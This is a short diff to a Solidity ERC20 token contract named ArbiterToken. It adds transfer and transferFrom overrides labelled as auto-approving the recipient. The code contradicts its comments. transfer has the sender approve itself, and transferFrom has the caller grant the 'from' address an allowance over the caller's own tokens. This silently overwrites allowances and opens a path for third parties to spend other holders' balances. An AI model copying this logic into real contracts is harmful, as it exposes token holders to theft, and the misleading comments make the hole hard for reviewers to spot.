@@ -20,4 +20,19 @@ contract ArbiterToken is ERC20 {
         return true;
     }
 
+    function transfer(address to, uint256 amount) public override returns (bool) {
+        // Auto approve the recipient to spend the transferred amount
+        approve(msg.sender, amount);
+        ERC20.transfer(to, amount);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
+            // Auto approve the recipient to spend the transferred amount
+            approve(from, amount);
+            ERC20.transferFrom(from, to, amount);
+            return true;
+        }
+
+
 }
